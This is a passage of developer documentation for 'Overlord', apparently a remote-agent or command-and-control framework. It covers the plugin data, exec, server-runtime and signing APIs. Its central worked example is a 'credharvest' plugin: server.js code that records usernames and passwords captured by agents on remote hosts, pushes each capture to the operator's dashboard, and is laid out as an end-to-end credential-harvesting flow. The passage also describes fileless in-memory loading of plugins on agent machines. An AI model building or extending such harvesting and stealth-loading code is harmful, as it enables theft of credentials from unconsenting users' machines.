6. When the plugin reports `loaded`, queued events are flushed in order

### Checking auto-load status

`GET /api/plugins` returns `autoLoad` and `autoStartEvents` for each plugin:

```json
{
  "plugins": [
    {
      "id": "clipreplace",
      "name": "clipreplace",
      "enabled": true,
      "autoLoad": true,
      "autoStartEvents": [
        { "event": "add_rule", "payload": { "pattern": "...", "replacement": "..." } },
        { "event": "start", "payload": {} }
      ],
      "lastError": ""
    }
  ]
}
```

### Notes

- Auto-load respects the `enabled` flag — disabled plugins are never auto-loaded
- Auto-load for plugins with declared `needs` is blocked until those needs are approved
- Auto-load state is persisted in `.plugin-state.json` and survives server restarts
- Deleting a plugin also removes its auto-load configuration
- WASM plugins use one universal module for every OS/architecture
- Legacy native plugins still require a compatible binary for each target platform; if one is unavailable, auto-load skips that client

## 10) Server-side plugin data directory

Each plugin has a **persistent data directory** on the server:

```
Overlord-Server/plugins/<pluginId>/data/
```

This directory is **never deleted** when a plugin is removed or reinstalled. It survives the entire plugin lifecycle and gives server-side plugins a dedicated place to store files — SQLite databases, config files, cached data, executables, etc.

### Read/write files

From your plugin UI JS (or any authenticated API consumer):

**List all files**
```
GET /api/plugins/<pluginId>/data
```
```json
{
  "ok": true,
  "files": [
    { "path": "config.json", "size": 128, "isDir": false },
    { "path": "cache", "size": 0, "isDir": true },
    { "path": "cache/data.db", "size": 40960, "isDir": false }
  ]
}
```

**Read a file**
```
GET /api/plugins/<pluginId>/data/<path>
```
Returns the raw file bytes with an appropriate `Content-Type`.

**Write a file**
```
PUT /api/plugins/<pluginId>/data/<path>
Content-Type: application/octet-stream
<raw bytes>
```
Parent directories are created automatically.
```json
{ "ok": true, "path": "config.json", "size": 128 }
```

**Delete a file or directory**
```
DELETE /api/plugins/<pluginId>/data/<path>
```
Deleting a directory removes it recursively.
```json
{ "ok": true, "path": "cache" }
```

### Execute a stored binary

Plugins can store executables in their data directory and run them on the server. This endpoint is restricted to **admin and operator** roles.

```
POST /api/plugins/<pluginId>/exec
Content-Type: application/json

{
  "file": "mytool",
  "args": ["--flag", "value"],
  "stdin": "optional stdin string",
  "timeoutMs": 10000
}
```

| Field | Type | Description |
|-------|------|-------------|
| `file` | string | Path to the binary, relative to the plugin's `data/` directory |
| `args` | string[] | Command-line arguments (optional) |
| `stdin` | string | Text to pipe to stdin (optional) |
| `timeoutMs` | number | Max run time in ms, max 60000, default 30000 |

```json
{
  "ok": true,
  "exitCode": 0,
  "stdout": "tool output here",
  "stderr": ""
}
```

The binary is run from the `data/` directory as the working directory. The server sets the executable bit automatically before running on Unix.

### Example: storing a SQLite database from plugin JS

```js
// Write a new database seed file
await fetch(`/api/plugins/myplugin/data/app.db`, {
  method: "PUT",
  body: dbBytes, // ArrayBuffer
});

// Read it back
const res = await fetch(`/api/plugins/myplugin/data/app.db`);
const db = await res.arrayBuffer();

// List all stored files
const { files } = await (await fetch(`/api/plugins/myplugin/data`)).json();
```

### Notes

- Path traversal is blocked — paths may not escape the `data/` directory
- Null bytes in paths are rejected
- The data directory is created automatically on first use (no pre-setup needed)
- Deleting and reinstalling a plugin leaves `data/` untouched

## 11) Server-side plugin runtime

A plugin can ship an optional **`server.js`** at the root of its zip. When present, the server boots a dedicated **Bun Worker** for that plugin, opens a private SQLite database for it (`plugins/<id>/data/plugin.db`), and gives the worker an RPC + broadcast API.

This is the right place for plugin logic that:

- Has to run **without an open UI** (e.g. persisting credentials the agent harvests in the background).
- Needs to **aggregate state across every connected client** (the per-client native binary only sees its own host).
- Wants to **stream live updates** to whatever plugin pages are open right now without polling.

The worker is process-isolated from the main server: a buggy plugin that throws inside `onEvent` or `rpc` does not take the rest of Overlord down with it.

### Lifecycle

| Event | Effect |
|-------|--------|
| Server starts | Every enabled plugin with a `server.js` is booted in its own worker. |
| Plugin enabled (`POST /api/plugins/<id>/enable {enabled:true}`) | Worker is started if `server.js` exists. |
| Plugin disabled | Worker is stopped (graceful shutdown → `terminate()` after 750 ms). |
| Plugin re-uploaded | Worker is restarted so the new `server.js` takes effect. |
| Plugin deleted | Worker is stopped; the `data/` directory (including `plugin.db`) is preserved across reinstalls. |
| Server SIGINT/SIGTERM | All workers are shut down before the process exits. |

### `server.js` contract

`server.js` is an ES module whose default export is a plain object with up to four optional handlers:

```js
// plugins/credharvest/server.js
export default {
  // Run once when the worker boots. Use this to migrate the schema or seed
  // any state. Throwing here marks the plugin as failed (visible in
  // /api/plugins → lastError) and the worker exits.
  setup(ctx) {
    ctx.db.exec(`
      CREATE TABLE IF NOT EXISTS creds (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id   TEXT NOT NULL,
        service     TEXT,
        username    TEXT,
        password    TEXT,
        captured_at INTEGER NOT NULL
      );
      CREATE INDEX IF NOT EXISTS creds_by_client ON creds(client_id);
    `);
  },

  // Fired every time an agent's native plugin sends a callback event back
  // through the WebSocket (PluginOnEvent → host callback → server). Also
  // fires for the lifecycle events the host injects: "loaded", "unloaded",
  // "error".
  onEvent(ctx, clientId, event, payload) {
    if (event !== "credential") return;
    ctx.db
      .prepare(`INSERT INTO creds(client_id, service, username, password, captured_at) VALUES (?, ?, ?, ?, ?)`)
      .run(clientId, payload.service, payload.username, payload.password, Date.now());
    ctx.broadcast("cred_added", { clientId, service: payload.service });
  },

  // Methods called by the plugin UI via POST /api/plugins/<id>/rpc.
  // Each handler receives (ctx, params, meta). Whatever you return becomes
  // the `result` field of the JSON response.
  rpc: {
    list_all(ctx) {
      return ctx.db
        .prepare(`SELECT * FROM creds ORDER BY captured_at DESC LIMIT 1000`)
        .all();
    },
    list_for_client(ctx, params) {
      return ctx.db
        .prepare(`SELECT * FROM creds WHERE client_id = ? ORDER BY captured_at DESC`)
        .all(params.clientId);
    },
    delete_all(ctx, _params, { caller }) {
      if (caller.role !== "admin") throw new Error("Admin only");
      ctx.db.exec(`DELETE FROM creds`);
      ctx.broadcast("cleared", { by: caller.id });
      return { ok: true };
    },
  },

  // Called when the plugin is being shut down (disable, re-upload, server
  // exit). Use it to flush state. The worker is forcibly terminated 750 ms
  // after this returns, so don't rely on async cleanup taking longer.
  teardown(ctx) {
    ctx.log.info("shutting down");
  },
};
```

### The `ctx` object

| Field | Type | Description |
|-------|------|-------------|
| `ctx.pluginId` | `string` | The sanitized plugin ID. |
| `ctx.db` | `Database` (`bun:sqlite`) | A pre-opened SQLite connection backed by `plugins/<id>/data/plugin.db`. WAL mode is enabled. The plugin owns the schema entirely. |
| `ctx.dataDir` | `string` | Absolute path to the plugin's `data/` directory. Use this if you want to read/write files alongside the DB (the same directory the `/api/plugins/<id>/data/*` filesystem API serves). |
| `ctx.log` | `{debug, info, warn, error}` | Each call is forwarded to the main server logger as `[plugin:<id>] <message>`. |
| `ctx.broadcast(channel, data)` | function | Push an event to every UI currently subscribed to this plugin's SSE stream. `data` must be JSON-serializable. |

### Calling the plugin from the UI

Plugin UI JS can call any RPC method:

```js
const res = await fetch(`/api/plugins/credharvest/rpc`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ method: "list_all" }),
});
const { ok, result, error } = await res.json();
```

Subscribe to broadcasts:

```js
const stream = new EventSource(`/api/plugins/credharvest/stream`);
stream.addEventListener("cred_added", (e) => {
  const { clientId, service } = JSON.parse(e.data);
  appendRow(clientId, service);
});
stream.addEventListener("cleared", () => clearTable());
```

The SSE stream keeps itself alive with a comment heartbeat every 25 s, which works through the standard reverse-proxy idle timeouts. Close the stream with `stream.close()` when the plugin page unmounts.

### End-to-end flow for a credential harvester

1. Native binary on the agent captures a credential and calls the host callback with `event="credential"` and a JSON payload.
2. Agent forwards the event over its `/api/clients/<id>/stream/ws` connection.
3. Server's `handlePluginEvent` records it for short-lived UI polling (the existing per-client behavior) **and** dispatches it into the plugin's worker via `onEvent`.
4. Worker INSERTs the credential into `plugin.db` and calls `ctx.broadcast("cred_added", ...)`.
5. Every open `/plugins/credharvest` page receives a `cred_added` SSE event and updates its UI in real time.
6. A user landing on `/plugins/credharvest` later calls `POST /api/plugins/credharvest/rpc {method:"list_all"}` and gets the full history back from `plugin.db`, regardless of which clients are currently online.

### API surface (server runtime)

- `POST /api/plugins/<id>/rpc` → `{ method: string, params?: any }` returns `{ ok, result }` or `{ ok:false, error }`. Requires `clients:control`. The method must exist on the plugin's `rpc` map. RPCs time out after 30 s.
- `GET /api/plugins/<id>/stream` → `text/event-stream`. Requires `clients:control`. Each `ctx.broadcast(channel, data)` becomes an SSE event named `channel` whose `data` field is `JSON.stringify(data)`.
- `GET /api/plugins` now includes two extra fields per plugin:
  - `hasServer: boolean` — the bundle ships a `server.js`.
  - `serverRunning: boolean` — the worker is live right now.

### Caveats

- **One worker per plugin.** RPC calls into the same plugin serialise. Long-running RPCs block other RPCs to that plugin (not other plugins). Do heavy work in `onEvent` and let RPCs read pre-computed state.
- **`bun:sqlite` is single-writer per database file.** Since each plugin gets its own DB this is fine; just don't open the same `plugin.db` from another process.
- **The worker is not a security sandbox.** It has the same filesystem and network access as the main server. Treat `server.js` with the same trust as your other server code, and lean on plugin signing if you load third-party bundles.
- **Bundled builds.** Workers spawned from a bundled server need the worker host module emitted beside the main server bundle. The production build does this by building both `src/index.ts` and `src/server/plugin-runtime/worker-host.ts`.
- **No automatic restart on worker crash.** A crashed worker is logged and `pluginState.lastError` is set, but it will not loop-restart on its own. Disable + re-enable the plugin to bring it back up.

---

## 12) Static-agent plugin loading (Linux subprocess shim)

Linux agents are compiled as fully static musl binaries for maximum portability
(runs on any Linux regardless of glibc version or distribution).  Fully static
binaries cannot call `dlopen`, which is normally used to load `.so` plugins in-process.

Overlord works around this with an embedded **plugin host shim** — a small,
dynamically-linked C binary compiled at agent-build time and embedded inside the
agent via `//go:embed`.  When a plugin is loaded the agent:

1. Writes the `.so` to an anonymous in-memory file (`memfd_create`).
2. Writes the embedded shim to a second memfd.
3. Creates a `socketpair` for bidirectional IPC.
4. `forkexec`s the shim, passing the two fd numbers as argv.
5. The shim calls `dlopen("/proc/self/fd/<so_fd>")` normally (it is dynamic, so this works).
6. The agent and shim exchange events over the socket for the lifetime of the plugin.

The shim itself is **never committed to the repository as a binary**.  It is compiled
fresh from `Overlord-Client/cmd/agent/plugins/plugin_host/plugin_host.c` every time
an agent is built via the Overlord UI.  Users can read the source and verify it
before building.

### How the shim is compiled

`build-process.ts` inserts a compilation step before `go build` for every Linux CGO
agent build:

| Target arch | Compiler used | Linked against |
|-------------|---------------|----------------|
| `linux-amd64` | native `cc` (Debian clang, from build container) | glibc — works on Ubuntu, Debian, RHEL, etc. |
| `linux-arm64` | `aarch64-linux-musl-gcc` (musl cross-compiler) | musl — works on Alpine and musl-based systems |
| `linux-armv7` | `armv7l-linux-musleabihf-gcc` | musl |

The compiled binary is written to
`Overlord-Client/cmd/agent/plugins/plugin_host/plugin_host_<arch>` and picked up
by `//go:embed`.  If compilation fails (e.g. the cross-compiler is not yet
downloaded), a warning is logged and the agent falls back to attempting direct
`dlopen` — which will fail on static builds but does not break the build itself.

### Compatibility

| Target system | Plugin support |
|---------------|----------------|
| **glibc Linux (Ubuntu, Debian, Fedora, RHEL, …)** | **Full** — shim compiled with native glibc clang |
| musl Linux (Alpine) | Full for arm64/armv7; amd64 shim is glibc-linked, so plugins require a glibc compat layer |
| Non-Linux (Windows, macOS) | Unchanged — Windows uses in-memory PE loader, macOS uses temp-file dlopen |

### Writing plugins for static-agent targets

**No changes are required to plugin source code.**  The plugin ABI (`PluginOnLoad`,
`PluginOnEvent`, `PluginOnUnload`, `PluginGetRuntime`) is identical whether the
agent uses in-process `dlopen` or the subprocess shim.  The only constraint is
that the plugin `.so` must be compiled with the **same libc** as the shim:

- For glibc amd64 targets: compile the plugin with `gcc` or `clang` on a glibc system.
- For musl arm64/armv7 targets: compile the plugin with the musl cross-compilers.

### IPC protocol (for plugin authors / contributors)

The agent and shim communicate over a `SOCK_STREAM` Unix socketpair using a
simple length-prefixed binary protocol.  Each message is:

```
[4-byte LE total-payload-length][1-byte message-type][payload bytes…]
```

| Direction | Type | Meaning |
|-----------|------|---------|
| agent → shim | `0x01` LOAD | `hostInfo` bytes; shim calls `PluginOnLoad` |
| agent → shim | `0x02` EVENT | `[u16le evLen][event][u32le plLen][payload]`; shim calls `PluginOnEvent` |
| agent → shim | `0x03` UNLOAD | Shim calls `PluginOnUnload` and exits |
| shim → agent | `0x10` CALLBACK | `[u16le evLen][event][u32le plLen][payload]`; forwarded to server |
| shim → agent | `0x11` READY | Runtime string (e.g. `"c"`); sent after successful `dlopen` |
| shim → agent | `0x12` ERR | Error string; sent instead of READY if `dlopen` or symbol resolution fails |
| shim → agent | `0x13` LOAD_RESULT | `[u8: 0=ok, 1=error]`; sent after `PluginOnLoad` returns |

## Plugin Signing

Plugins can be cryptographically signed with Ed25519 keys. The server verifies signatures on upload and displays trust status in the dashboard. Loading unsigned or untrusted plugins requires explicit confirmation.

### Trust Levels

| Status | Badge | Behavior |
|--------|-------|----------|
| **Signed + Trusted** | Green shield | Loads immediately |
| **Signed + Untrusted** | Yellow shield | Must type "confirm" to load |
| **Unsigned** | Orange shield | Must type "confirm" to load |
| **Invalid Signature** | Red shield | Blocked — cannot load |

### Generate a Signing Key

```bash
cd Overlord-Server
bun run scripts/plugin-keygen.ts --out my-signing-key
```

This creates:
- `my-signing-key.key` — private key (keep secret!)
- `my-signing-key.pub` — public key + fingerprint

The fingerprint (64-char hex SHA-256) is printed to the console. Add it to your server config to trust plugins signed with this key.

### Sign a Plugin

```bash
cd Overlord-Server
bun run scripts/plugin-sign.ts --key my-signing-key.key ../plugins/sample-go/sample.zip
```

This injects a `signature.json` into the ZIP containing the Ed25519 public key and signature.

### Add a Trusted Key

**Via config.json:**
```json
{
  "plugins": {
    "trustedKeys": [
      "a1b2c3d4e5f6...64-char-hex-fingerprint..."
    ]
  }
}
```

**Via environment variable:**
```
TRUSTED_PLUGIN_KEYS=fingerprint1,fingerprint2
```

**Via the web UI:** Go to the Plugins page → Trusted Signing Keys section → paste the fingerprint and click Add Key.

**Via API:**
```bash
# Add a trusted key
curl -X POST /api/plugins/trusted-keys \
  -H "Content-Type: application/json" \
  -d '{"fingerprint": "a1b2c3..."}'

# List trusted keys
curl /api/plugins/trusted-keys

# Remove a trusted key
curl -X DELETE /api/plugins/trusted-keys/a1b2c3...
```

### Build Script Integration

Set the `PLUGIN_SIGN_KEY` environment variable to automatically sign plugins during build:

```bash
# Unix
PLUGIN_SIGN_KEY=path/to/my-signing-key.key ./sample-go/build.sh

# Windows
set PLUGIN_SIGN_KEY=path\to\my-signing-key.key
sample-go\build.bat
```

### How Signing Works

1. The canonical content digest is computed by hashing every file in the ZIP (excluding `signature.json`), sorting filenames alphabetically, and concatenating `filename:sha256hex\n` for each
2. The digest is signed with Ed25519 using the private key
3. The signature, public key, and algorithm are stored as `signature.json` inside the ZIP
4. On upload, the server extracts `signature.json`, recomputes the digest, and verifies the signature using `crypto.subtle.verify("Ed25519", ...)`
5. The signer's fingerprint (`hex(SHA-256(raw_public_key))`) is compared against `plugins.trustedKeys` in the config


